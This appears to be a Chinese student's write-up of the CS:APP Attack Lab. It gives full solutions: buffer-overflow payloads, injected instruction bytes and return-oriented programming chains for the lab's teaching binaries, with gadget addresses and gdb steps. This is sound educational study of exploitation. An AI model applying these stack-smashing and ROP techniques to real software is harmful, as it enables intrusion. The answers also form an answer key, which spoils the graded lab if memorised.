# Attacklab实验

- [Attacklab实验](#attacklab实验)
  - [Part1：Code Injection Attacks](#part1code-injection-attacks)
    - [Level1](#level1)
    - [level1实战](#level1实战)
    - [Level2](#level2)
    - [level2实战](#level2实战)
    - [Level3](#level3)
    - [level3实战](#level3实战)
  - [Part2: Return-Oriented Programming](#part2-return-oriented-programming)
    - [Level4](#level4)
    - [level4实战](#level4实战)
    - [level5](#level5)
    - [level5实战](#level5实战)
    - [附录：实战farm](#附录实战farm)

## Part1：Code Injection Attacks

### Level1

题目给出C代码如下，需要将在执行test函数中的getbuf函数时，返回地址改为touch1。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

汇编代码如下：

```c
    // getbuf 函数汇编代码
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp   // 开辟0x28即40个字节，即对应缓冲区大小为40
    0x00000000004017ac <+4>:	mov    %rsp,%rdi    // rdi为Gets函数的第一个参数，即输入的首地址
    0x00000000004017af <+7>:	callq  0x401a40 <Gets>
    0x00000000004017b4 <+12>:	mov    $0x1,%eax    // 返回值为1
    0x00000000004017b9 <+17>:	add    $0x28,%rsp
    0x00000000004017bd <+21>:	retq                // getbuf返回，从rax:rsp+0x28处获取返回地址

    // touch1函数汇编代码
    0x00000000004017c0 <+0>:	sub    $0x8,%rsp    // 这里可以看到touch1函数的首地址是0x4017c0
    0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)   // 0x6044dc <vlevel>
    0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
    0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
    0x00000000004017d8 <+24>:	mov    $0x1,%edi
    0x00000000004017dd <+29>:	callq  0x401c8d <validate>
    0x00000000004017e2 <+34>:	mov    $0x0,%edi
    0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

key：首先判断系统是大端还是小端地址，使用Ubuntu18.04云服务器运行以下代码测试：返回结果为该系统编址类型为小端编址

```c
# include<stdio.h>
int JudgeSystem(void)
{
        int a = 1;
        //如果是小端则返回1，如果是大端则返回0
        return *(char *)&a;
        // 本质是判断int值的低地址是否存着1，如果是小端那么低地址存低位即返回1
}

int main(void)
{
        int ret = JudgeSystem();
        if (1 == ret)
        {
                printf("该系统是小端存储模式！\n");
        }
        else
        {
                printf("该系统是大端存储模式！\n");
        }
        return 0;
}

```

Answer：只要我们输入的数组超过缓冲区大小，且将touch1的首地址（0x4017c0）覆盖getbuf的返回地址，任务即完成。要点：

- 注意每个字节有两个数字，一行4个字节（32位）
- 小端编址低地址放低位，从rsp开始一个个放数，先输入数组的是低地址。

输入答案十六进制如下：

```c
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00
```

将其存放在1.txt中，使用以下命令即可通过

```c
./hex2raw <1.txt >2.txt     //转化为字符串
./ctarget -qi 2.txt     //从文件中读入并且不提交最终结果
```

### level1实战

获取touch1地址：0x401884
获取getbuf开辟空间：0x38 (56)
答案：
```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
84 18 40 00
```

### Level2

目的为执行touch2，且传入val值需要等于cookie，cookie值为0x59b997fa。
主要思路：getbuf返回地址设置为$rsp， $rsp处放置我们的注入代码——将rsp的值移入rdi，压栈touch2的返回地址，返回。
touch2代码如下

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

touch2的汇编代码如下：

```c
    0x00000000004017ec <+0>:	sub    $0x8,%rsp    // 可以看到首地址为0x004017ec
    // ……其他代码
```

Answer：我们只需要将cookie的值0x59b997fa放入rdi中（注入代码），然后调用touch2即可，仍然注意是小端编址。
此外需要注意一点是我们本题限制了使用jump等方式跳转，所以使用ret跳转，ret跳转需要将0x4017ec压栈。
注入代码如下（存放在2inject.s中）

```c
    movq    $0x59b997fa, %rdi       // 直接把$0x59b997fa即cookie的值移动到%rdi
    pushq   $0x4017ec               // 入栈，即之后返回地址为0x4017ec
    ret
```

使用gcc -c 2inject.s 转化为二进制2inject.o，
使用objdump -d 2inject.o 生成对应指令序列

```c
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

有了指令序列，我们还需要获取%rsp的地址，覆盖getbuf的返回地址。

```c
gdb -q ctarget
break getbuf        // 在getbuf处设置断点
run -q              // 执行到断点
disas               // 反汇编当前断点函数
stepi               // 步进
p $rsp              // 获取rsp的位置，这里我们获取到了(void *) 0x5561dc78，即rsp位置为0x5561dc78
```

所以最终输入结果如下，注意指令序列是按照小端编码返回的，因此我们也只需要原封不动地放回即可。

```c
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55
```

### level2实战

首先获取touch2首地址：0x004018b2
获取cookie：0x55daf469
注入代码如下：
```c
    movq    $0x55daf469, %rdi
    pushq   $0x4018b2
    ret
```
获得指令序列：
```c
0:	48 c7 c7 69 f4 da 55 	mov    $0x55daf469,%rdi
7:	68 b2 18 40 00       	pushq  $0x4018b2
c:	c3                   	retq
```
再获取到进入getbuf函数后的rsp的地址：0x55676d78
所以最终结果如下：
```c
48 c7 c7 69 f4 da 55 68
b2 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 6d 67 55
```

### Level3

目的为执行touch3，且满足string == cookie（0x59b997fa），注意到cookie的ascii表示为：35 39 62 39 39 37 66 61
代码:

```c
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];     // 注意这里直接
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
//hexmatch汇编代码，注意到这里有三轮压栈，压栈的本质是rsp增长，所以谨慎是否会覆盖我们的字串。
0x000000000040184c <+0>:	push   %r12
0x000000000040184e <+2>:	push   %rbp
0x000000000040184f <+3>:	push   %rbx
//……其他代码

void touch3(char *sval)     //   函数开始地址为：0x4018fa
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
//touch3的汇编代码：注意到这里有进行一轮压栈
0x00000000004018fa <+0>:	push   %rbx
//……其他代码
```

answer：我们将string的ascii形式注入，并调用touch3函数。
- 注意到这里是字符串所以我们不能再直接将cookie的值移动到%rdi
- 注意到函数压栈可能会破坏getbuf的空间（函数都没有开辟新空间而是直接push）解析：在getbuf返回后rsp加回时，直接调用touch3就会使得部分我们的字串被覆盖。

所以我们直接放在test的栈帧中（超过getbuf的返回地址即test的栈帧了）
- 获取到test的$rsp地址为 0x5561dca0，因此我们只需要加上8：0x5561dca8即为我们的字符串首地址
![栈说明](https://upload-images.jianshu.io/upload_images/1433829-4f564d4ccfc8b962.png?imageMogr2/auto-orient/strip|imageView2/2/w/569/format/webp)

```c
    movq    $0x5561dca8, %rdi       // 把0x5561dca8的地址作为cookie的存放点，移动到%rdi
    pushq   $0x4018fa               // 入栈，即之后返回地址为0x4018fa（touch3）
    ret
    //编译后再反汇编得到指令
    0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
    7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   	retq
```

所以最终输入结果如下
```c
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

### level3实战

首先获取touch3地址：0x4019c9
将我们的cookie（0x55daf469）转化为asc2码表示：35 35 64 61 66 34 36 39
同level3的思路，我们直接把字串放到test的栈帧中，获取到test的rsp地址：0x55676db8（之前的rsp+0x40）
所以生成我们的注入代码即对应指令串
```c
    movq    $0x55676db8, %rdi
    pushq   $0x4019c9
    ret
    // 翻译后的指令为：
    0:	48 c7 c7 b8 6d 67 55 	mov    $0x55676db8,%rdi
    7:	68 c9 19 40 00       	pushq  $0x4019c9
    c:	c3                   	ret
```
所以最终输入结果如下：
```c
48 c7 c7 b8 6d 67 55 68
c9 19 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 6d 67 55 00 00 00 00
35 35 64 61 66 34 36 39
```

## Part2: Return-Oriented Programming

在进入level4之前，我们先认识一下Return-Oriented Programming（ROP）
一般程序都有开启**栈随机化**与栈保护（不能执行栈内代码），因此之前的方法不再适用。
所以我们便需要转换思路，利用现有程序中的代码。
例如，我们有下列代码：
```c
void setval_210(unsigned *p)
{
*p = 3347663060U;
}
//进行编译……
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```
注意到**48 89 c7**为 movq %rax, %rdi.
因此，如果我们从400f18开始执行的话，相当于执行了
```c
movq %rax, %rdi
retq
```
这种可以利用的代码称为**gadget**，利用gadgets我们可以实现对程序的攻击

### Level4

先找到farm地址范围：0x401994~0x401ab7，用objdump输出到文件(使用>)后找到该范围，具体参见附录
目标：在栈随机化和栈保护的基础上，实现level2的功能。
- 1、rdi赋值为cookie
- 2、执行touch2

我们不能再找到movq    $0x59b997fa, %rdi或是pushq &0x4017ec这样的代码，但我们可以想其他方式移动到rdi中
首选为popq %rdi，但没有在farm中，我们只找到了58（popq %rax）
因此方式为：
```c
popq %rax               //58
moveq %rax, %rdi        //48 89 c7
ret
```
我们找到所需函数
```c
// 开始地址为0x4019ab，注意之后return为调用该函数的下一条指令（64位8字节）
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3
// 开始地址为0x4019c5
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3
```
所以生成答案：
```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00     // 进入第一个函数执行popq %rax及ret
fa 97 b9 59 00 00 00 00     // 我们的cookie，注意此时rsp的值，刚好popq会把此处的值弹出到rax中
c5 19 40 00 00 00 00 00     // 进入第二个函数执行moveq %rax, %rdi及ret
ec 17 40 00 00 00 00 00     // 最终touch2，作为第二个函数return的地址被返回
```

**注意**：这里有一个非常有意思的点是rsp的位置变换，我们假设rsp初始为0x130。调用call getbuf首先压栈0x8存返回地址，然后根据函数内容压栈0x28存放数据。最终返回后rsp也为0x130。这也是为什么我们执行popq %rax（本质为moveq %rsp, %rax；sub $8, %rsp）时，调取的是返回地址以上的test部分栈帧内容。
**注意2**：第二个有意思的点是return的寻址。return本质是弹出栈顶的一个元素作为返回地址。我们可以看到在没有call而直接进入函数后，return寻址会弹出一个栈顶内容作为返回地址。这也是为什么我们执行ret时，它会执行我们的第二个函数。
![栈说明2](https://upload-images.jianshu.io/upload_images/1433829-45d42fcf3d5bcca4.png?imageMogr2/auto-orient/strip|imageView2/2/w/568/format/webp)

### level4实战

我们的方式为：
```c
popq %rax               //58
moveq %rax, %rdi        //48 89 c7
ret
```
首先反编译出farm，然后在farm中找到`58 c3`:401a9b
然后找`48 89 c7 c3`:401a90
获取touch2地址：4018b2
所以根据cookie：0x55daf469生成答案：
```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9b 1a 40 00 00 00 00 00
69 f4 da 55 00 00 00 00
90 1a 40 00 00 00 00 00
b2 18 40 00 00 00 00 00
```

### level5

Level5官方pdf一上来就直接劝退：你如果有其他要紧事，就别做这题了，才5分…… 不过想来会很有趣，让我们一起来做这道题。
本题的目的：
- 把字符串的十六进制（35 39 62 39 39 37 66 61）的起始地址传送到%rdi
- 调用touch3
注意到我们不可能再用地址来索引字串起始地址，因此使用栈顶地址+偏移量来索引，所以整体思路如下：
1. 获取%rsp地址，传送到%rdi
2. 获取字符串偏移值，传送到某个寄存器如%rsi
3. %rdi + %rsi表示字符串首地址，传输到%rdi，即lea (%rdi, %rsi, 1), %rdi
4. 调用touch3

关键问题与对应解决如下
- 没有直接可以调用的movq %rsp, %rdi，但有movq %rsp, %rax.
- 我们凑不到lea (%rdi, %rsi, 1), %rdi的指令，但我们恰好有lea (%rdi, %rsi, 1), %rax的指令 48 8d 04 37，之后再移动至%rdi
- 注意初始存的%rsp的值，对应的是test栈帧中存的放回地址的+0x8.

所以总体解决方案如下
```c
1. movq %rsp, %rax    // 48 89 e0   0x401a06  注意之后每一个都有个返回
2. movq %rax, %rdi    // 48 89 c7   0x4019c5
3. 在缓冲区存放string偏移量，并popq %rax    // 58   0x4019ab
4. movl %eax, %edx    // 89 c2    0x4019dd
5. movl %edx, %ecx    // 89 d1    0x401a70  注意到这里后面还有一个91的指令才到c3，不过不会对我们造成影响
6. movl %ecx, %esi    // 89 ce    0x401a13
7. lea (%rdi, %rsi, 1), %rax      // 48 8d 04 37    0x4019d6
8. movq %rax,%rdi     // 48 89 c7   0x4019c5
```

于是我们可以生成我们的代码了
```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00     // 进入0x401a06执行movq %rsp, %rax，之后返回在下一条指令
c5 19 40 00 00 00 00 00     // 进入0x4019c5执行movq %rax, %rdi，**初始rsp也在这里**
ab 19 40 00 00 00 00 00     // 进入0x4019ab执行popq %rax，弹出我们的string偏移量后再返回
48 00 00 00 00 00 00 00     // 我们的string偏移量，注意我们存rsp的位置（此处+0x10）
dd 19 40 00 00 00 00 00     // 进入0x4019dd执行movl %eax, %edx，之后返回
70 1a 40 00 00 00 00 00     // 进入0x401a70执行movl %edx, %ecx，之后返回（此处+0x20）
13 1a 40 00 00 00 00 00     // 进入0x401a13执行movl %ecx, %esi，之后返回
d6 19 40 00 00 00 00 00     // 进入0x4019d6执行lea (%rdi, %rsi, 1), %rax，之后返回（此处+0x30）
c5 19 40 00 00 00 00 00     // 进入0x4019c5执行movq %rax,%rdi，之后返回+0x8
fa 18 40 00 00 00 00 00     // 进入0x4018fa执行touch3 注意这里不是callq所以没有压栈，此时（此处+0x40）
35 39 62 39 39 37 66 61     // 我们的string（此处+0x48，所以得到偏移量为48）
```

### level5实战

首先获取farm，存储在附录中。解决方案同level
```c
1. movq %rsp, %rax    // 48 89 e0   0x401b62  注意之后每一个都有个返回
2. movq %rax, %rdi    // 48 89 c7   0x401a75
3. 在缓冲区存放string偏移量，并popq %rax    // 58   0x401a9b
4. movl %eax, %edx    // 89 c2    0x401af0  注意到这后面还有一个92指令，不过不影响
5. movl %edx, %ecx    // 89 d1    0x401b68  注意到这里后面还有一个38 db的指令才到c3，不过不会对我们造成影响
6. movl %ecx, %esi    // 89 ce    0x401b7e
7. lea (%rdi, %rsi, 1), %rax      // 48 8d 04 37    0x401aa6
8. movq %rax,%rdi     // 48 89 c7   0x401a75
```
获取到touch3：0x4019c9
cookie的asc2表示：35 35 64 61 66 34 36 39
所以生成结果：
```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
62 1b 40 00 00 00 00 00     // 进入0x401b62执行movq %rsp, %rax，之后返回在下一条指令
75 1a 40 00 00 00 00 00     // 进入0x401a75执行movq %rax, %rdi，**初始rsp也在这里**
9b 1a 40 00 00 00 00 00     // 进入0x401a9b执行popq %rax，弹出我们的string偏移量后再返回
48 00 00 00 00 00 00 00     // 我们的string偏移量，注意我们存rsp的位置（此处+0x10）
f0 1a 40 00 00 00 00 00     // 进入0x401af0执行movl %eax, %edx，之后返回
68 1b 40 00 00 00 00 00     // 进入0x401b68执行movl %edx, %ecx，之后返回（此处+0x20）
7e 1b 40 00 00 00 00 00     // 进入0x401b7e执行movl %ecx, %esi，之后返回
a6 1a 40 00 00 00 00 00     // 进入0x401aa6执行lea (%rdi, %rsi, 1), %rax，之后返回（此处+0x30）
75 1a 40 00 00 00 00 00     // 进入0x401a75执行movq %rax,%rdi，之后返回+0x8
c9 19 40 00 00 00 00 00     // 进入0x4019c9执行touch3 注意这里不是callq所以没有压栈，此时（此处+0x40）
35 35 64 61 66 34 36 39     // 我们的string（此处+0x48，所以得到偏移量为48）
```

### 附录：实战farm

```c
0000000000401a66 <start_farm>:
  401a66:       b8 01 00 00 00          mov    $0x1,%eax
  401a6b:       c3                      retq
0000000000401a6c <setval_296>:
  401a6c:       c7 07 58 90 c3 44       movl   $0x44c39058,(%rdi)
  401a72:       c3                      retq
0000000000401a73 <addval_429>:
  401a73:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  401a79:       c3                      retq
0000000000401a7a <setval_320>:
  401a7a:       c7 07 48 99 c7 c3       movl   $0xc3c79948,(%rdi)
  401a80:       c3                      retq
0000000000401a81 <getval_237>:
  401a81:       b8 48 89 c7 94          mov    $0x94c78948,%eax
  401a86:       c3                      retq
0000000000401a87 <setval_497>:
  401a87:       c7 07 d1 48 90 c3       movl   $0xc39048d1,(%rdi)
  401a8d:       c3                      retq
0000000000401a8e <getval_333>:
  401a8e:       b8 68 48 89 c7          mov    $0xc7894868,%eax
  401a93:       c3                      retq
0000000000401a94 <getval_321>:
  401a94:       b8 e2 12 18 90          mov    $0x901812e2,%eax
  401a99:       c3                      retq
0000000000401a9a <getval_490>:
  401a9a:       b8 58 90 90 90          mov    $0x90909058,%eax
  401a9f:       c3                      retq
0000000000401aa0 <mid_farm>:
  401aa0:       b8 01 00 00 00          mov    $0x1,%eax
  401aa5:       c3                      retq
0000000000401aa6 <add_xy>:
  401aa6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  401aaa:       c3                      retq
0000000000401aab <getval_463>:
  401aab:       b8 48 89 e0 c1          mov    $0xc1e08948,%eax
  401ab0:       c3                      retq
0000000000401ab1 <addval_460>:
  401ab1:       8d 87 a9 d1 90 c3       lea    -0x3c6f2e57(%rdi),%eax
  401ab7:       c3                      retq
0000000000401ab8 <setval_212>:
  401ab8:       c7 07 89 c2 38 db       movl   $0xdb38c289,(%rdi)
  401abe:       c3                      retq
0000000000401abf <addval_341>:
  401abf:       8d 87 89 d1 c1 ff       lea    -0x3e2e77(%rdi),%eax
  401ac5:       c3                      retq
0000000000401ac6 <getval_400>:
  401ac6:       b8 48 89 e0 c2          mov    $0xc2e08948,%eax
  401acb:       c3                      retq
0000000000401acc <addval_173>:
  401acc:       8d 87 8d ce 38 d2       lea    -0x2dc73173(%rdi),%eax
  401ad2:       c3                      retq
0000000000401ad3 <getval_499>:
  401ad3:       b8 59 48 8d e0          mov    $0xe08d4859,%eax
  401ad8:       c3                      retq
0000000000401ad9 <setval_363>:
  401ad9:       c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
  401adf:       c3                      retq
0000000000401ae0 <addval_438>:
  401ae0:       8d 87 89 d1 38 c0       lea    -0x3fc72e77(%rdi),%eax
  401ae6:       c3                      retq
0000000000401ae7 <setval_181>:
  401ae7:       c7 07 48 89 e0 c3       movl   $0xc3e08948,(%rdi)
  401aed:       c3                      retq
0000000000401aee <addval_439>:
  401aee:       8d 87 89 c2 92 90       lea    -0x6f6d3d77(%rdi),%eax
  401af4:       c3                      retq
0000000000401af5 <addval_472>:
  401af5:       8d 87 89 ce 28 c9       lea    -0x36d73177(%rdi),%eax
  401afb:       c3                      retq
0000000000401afc <setval_199>:
  401afc:       c7 07 89 c2 20 c9       movl   $0xc920c289,(%rdi)
  401b02:       c3                      retq
0000000000401b03 <getval_457>:
  401b03:       b8 48 99 e0 c3          mov    $0xc3e09948,%eax
  401b08:       c3                      retq
0000000000401b09 <addval_107>:
  401b09:       8d 87 99 ce 90 c3       lea    -0x3c6f3167(%rdi),%eax
  401b0f:       c3                      retq
0000000000401b10 <getval_239>:
  401b10:       b8 89 c2 c1 a9          mov    $0xa9c1c289,%eax
  401b15:       c3                      retq
0000000000401b16 <getval_334>:
  401b16:       b8 89 d1 a4 c0          mov    $0xc0a4d189,%eax
  401b1b:       c3                      retq
0000000000401b1c <setval_473>:
  401b1c:       c7 07 89 ce 38 c0       movl   $0xc038ce89,(%rdi)
  401b22:       c3                      retq
0000000000401b23 <getval_189>:
  401b23:       b8 48 89 e0 91          mov    $0x91e08948,%eax
  401b28:       c3                      retq
0000000000401b29 <setval_318>:
  401b29:       c7 07 88 ce c3 32       movl   $0x32c3ce88,(%rdi)
  401b2f:       c3                      retq
0000000000401b30 <getval_447>:
  401b30:       b8 db 89 ce c2          mov    $0xc2ce89db,%eax
  401b35:       c3                      retq
0000000000401b36 <setval_399>:
  401b36:       c7 07 81 d1 08 c0       movl   $0xc008d181,(%rdi)
  401b3c:       c3                      retq
0000000000401b3d <setval_453>:
  401b3d:       c7 07 89 d1 00 c9       movl   $0xc900d189,(%rdi)
  401b43:       c3                      retq
0000000000401b44 <addval_380>:
  401b44:       8d 87 89 c2 c1 52       lea    0x52c1c289(%rdi),%eax
  401b4a:       c3                      retq
0000000000401b4b <addval_131>:
  401b4b:       8d 87 99 c2 20 c0       lea    -0x3fdf3d67(%rdi),%eax
  401b51:       c3                      retq
0000000000401b52 <getval_183>:
  401b52:       b8 8b ce 84 d2          mov    $0xd284ce8b,%eax
  401b57:       c3                      retq
0000000000401b58 <setval_414>:
  401b58:       c7 07 8b d1 20 d2       movl   $0xd220d18b,(%rdi)
  401b5e:       c3                      retq
0000000000401b5f <addval_228>:
  401b5f:       8d 87 62 48 89 e0       lea    -0x1f76b79e(%rdi),%eax
  401b65:       c3                      retq
0000000000401b66 <addval_235>:
  401b66:       8d 87 89 d1 38 db       lea    -0x24c72e77(%rdi),%eax
  401b6c:       c3                      retq
0000000000401b6d <setval_338>:
  401b6d:       c7 07 81 c2 20 c9       movl   $0xc920c281,(%rdi)
  401b73:       c3                      retq
0000000000401b74 <setval_241>:
  401b74:       c7 07 d0 81 c2 90       movl   $0x90c281d0,(%rdi)
  401b7a:       c3                      retq
0000000000401b7b <addval_132>:
  401b7b:       8d 87 52 89 ce c3       lea    -0x3c3176ae(%rdi),%eax
  401b81:       c3                      retq
0000000000401b82 <end_farm>:
  401b82:       b8 01 00 00 00          mov    $0x1,%eax
  401b87:       c3                      retq
```
